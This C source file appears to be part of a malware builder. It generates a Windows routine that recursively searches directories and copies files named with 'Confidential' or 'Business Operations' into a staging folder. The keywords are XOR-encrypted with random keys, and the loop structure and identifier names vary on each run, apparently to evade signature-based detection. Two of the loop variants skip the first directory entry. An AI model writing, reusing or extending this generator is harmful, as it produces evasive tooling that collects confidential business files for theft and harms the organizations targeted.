#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "dir_scan.h"

void write_dir_scan(FILE *output, const char *var_find_handle, const char *var_find_data, 
                    const char *var_out_dir, const char *var_temp_buf, const char *var_loop_counter, 
                    unsigned int seed, const char *func_scan_dir, const char *func_decrypt_str, 
                    const char *func_str_contains) {
    srand(seed);
    
    fprintf(output, "void %s(const char *path, HANDLE *%s, WIN32_FIND_DATAA %s, const char *%s, char *%s, int depth) {\n",
            func_scan_dir, var_find_handle, var_find_data, var_out_dir, var_temp_buf);
    
    fprintf(output, "    if (depth > 5) return;\n");
    fprintf(output, "    char search_path[256];\n");
    fprintf(output, "    snprintf(search_path, sizeof(search_path), \"%%s\\\\*\", path);\n");
    fprintf(output, "    *%s = FindFirstFileA(search_path, &%s);\n", var_find_handle, var_find_data);
    fprintf(output, "    if (*%s == INVALID_HANDLE_VALUE) return;\n", var_find_handle);
    
    // Decrypt keywords
    const char *keyword1 = "Confidential";
    const char *keyword2 = "Business Operations";
    unsigned char key1 = (unsigned char)(rand() % 256);
    unsigned char key2 = (unsigned char)(rand() % 256);
    
    fprintf(output, "    const char keyword1_enc[] = {");
    for (int i = 0; i < strlen(keyword1); i++) {
        fprintf(output, "0x%02x", (unsigned char)(keyword1[i] ^ key1));
        if (i < strlen(keyword1) - 1) fprintf(output, ", ");
    }
    fprintf(output, "};\n");
    fprintf(output, "    char keyword1[13];\n");
    fprintf(output, "    %s(keyword1, keyword1_enc, %d, %d);\n", func_decrypt_str, (int)strlen(keyword1), key1);
    
    fprintf(output, "    const char keyword2_enc[] = {");
    for (int i = 0; i < strlen(keyword2); i++) {
        fprintf(output, "0x%02x", (unsigned char)(keyword2[i] ^ key2));
        if (i < strlen(keyword2) - 1) fprintf(output, ", ");
    }
    fprintf(output, "};\n");
    fprintf(output, "    char keyword2[20];\n");
    fprintf(output, "    %s(keyword2, keyword2_enc, %d, %d);\n", func_decrypt_str, (int)strlen(keyword2), key2);
    
    // Random loop variation
    int loop_type = rand() % 3;
    if (loop_type == 0) {
        // Do-while loop
        fprintf(output, "    do {\n");
        fprintf(output, "        if (%s.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {\n", var_find_data);
        fprintf(output, "            if (strcmp(%s.cFileName, \".\") == 0 || strcmp(%s.cFileName, \"..\") == 0) continue;\n", 
                var_find_data, var_find_data);
        fprintf(output, "            snprintf(%s, 256, \"%%s\\\\%%s\", path, %s.cFileName);\n", var_temp_buf, var_find_data);
        fprintf(output, "            HANDLE file_handle_0;\n");
        fprintf(output, "            %s(%s, &file_handle_0, %s, %s, %s, depth + 1);\n", 
                func_scan_dir, var_temp_buf, var_find_data, var_out_dir, var_temp_buf);
        fprintf(output, "        } else if (%s(%s.cFileName, keyword1) || %s(%s.cFileName, keyword2)) {\n", 
                func_str_contains, var_find_data, func_str_contains, var_find_data);
        fprintf(output, "            char src_path[256], dst_path[256];\n");
        fprintf(output, "            snprintf(src_path, sizeof(src_path), \"%%s\\\\%%s\", path, %s.cFileName);\n", var_find_data);
        fprintf(output, "            snprintf(dst_path, sizeof(dst_path), \"%%s\\\\%%s\", %s, %s.cFileName);\n", 
                var_out_dir, var_find_data);
        fprintf(output, "            CopyFileA(src_path, dst_path, FALSE);\n");
        fprintf(output, "        }\n");
        fprintf(output, "    } while (FindNextFileA(*%s, &%s));\n", var_find_handle, var_find_data);
    } else if (loop_type == 1) {
        // While loop
        fprintf(output, "    while (FindNextFileA(*%s, &%s)) {\n", var_find_handle, var_find_data);
        fprintf(output, "        if (%s.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {\n", var_find_data);
        fprintf(output, "            if (strcmp(%s.cFileName, \".\") == 0 || strcmp(%s.cFileName, \"..\") == 0) continue;\n", 
                var_find_data, var_find_data);
        fprintf(output, "            snprintf(%s, 256, \"%%s\\\\%%s\", path, %s.cFileName);\n", var_temp_buf, var_find_data);
        fprintf(output, "            HANDLE file_handle_1;\n");
        fprintf(output, "            %s(%s, &file_handle_1, %s, %s, %s, depth + 1);\n", 
                func_scan_dir, var_temp_buf, var_find_data, var_out_dir, var_temp_buf);
        fprintf(output, "        } else if (%s(%s.cFileName, keyword1) || %s(%s.cFileName, keyword2)) {\n", 
                func_str_contains, var_find_data, func_str_contains, var_find_data);
        fprintf(output, "            char src_path[256], dst_path[256];\n");
        fprintf(output, "            snprintf(src_path, sizeof(src_path), \"%%s\\\\%%s\", path, %s.cFileName);\n", var_find_data);
        fprintf(output, "            snprintf(dst_path, sizeof(dst_path), \"%%s\\\\%%s\", %s, %s.cFileName);\n", 
                var_out_dir, var_find_data);
        fprintf(output, "            CopyFileA(src_path, dst_path, FALSE);\n");
        fprintf(output, "        }\n");
        fprintf(output, "    }\n");
    } else {
        // For loop with counter
        fprintf(output, "    for (int %s = 0; FindNextFileA(*%s, &%s); %s++) {\n", 
                var_loop_counter, var_find_handle, var_find_data, var_loop_counter);
        fprintf(output, "        if (%s.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {\n", var_find_data);
        fprintf(output, "            if (strcmp(%s.cFileName, \".\") == 0 || strcmp(%s.cFileName, \"..\") == 0) continue;\n", 
                var_find_data, var_find_data);
        fprintf(output, "            snprintf(%s, 256, \"%%s\\\\%%s\", path, %s.cFileName);\n", var_temp_buf, var_find_data);
        fprintf(output, "            HANDLE file_handle_2;\n");
        fprintf(output, "            %s(%s, &file_handle_2, %s, %s, %s, depth + 1);\n", 
                func_scan_dir, var_temp_buf, var_find_data, var_out_dir, var_temp_buf);
        fprintf(output, "        } else if (%s(%s.cFileName, keyword1) || %s(%s.cFileName, keyword2)) {\n", 
                func_str_contains, var_find_data, func_str_contains, var_find_data);
        fprintf(output, "            char src_path[256], dst_path[256];\n");
        fprintf(output, "            snprintf(src_path, sizeof(src_path), \"%%s\\\\%%s\", path, %s.cFileName);\n", var_find_data);
        fprintf(output, "            snprintf(dst_path, sizeof(dst_path), \"%%s\\\\%%s\", %s, %s.cFileName);\n", 
                var_out_dir, var_find_data);
        fprintf(output, "            CopyFileA(src_path, dst_path, FALSE);\n");
        fprintf(output, "        }\n");
        fprintf(output, "    }\n");
    }
    
    fprintf(output, "    FindClose(*%s);\n", var_find_handle);
    fprintf(output, "}\n\n");
}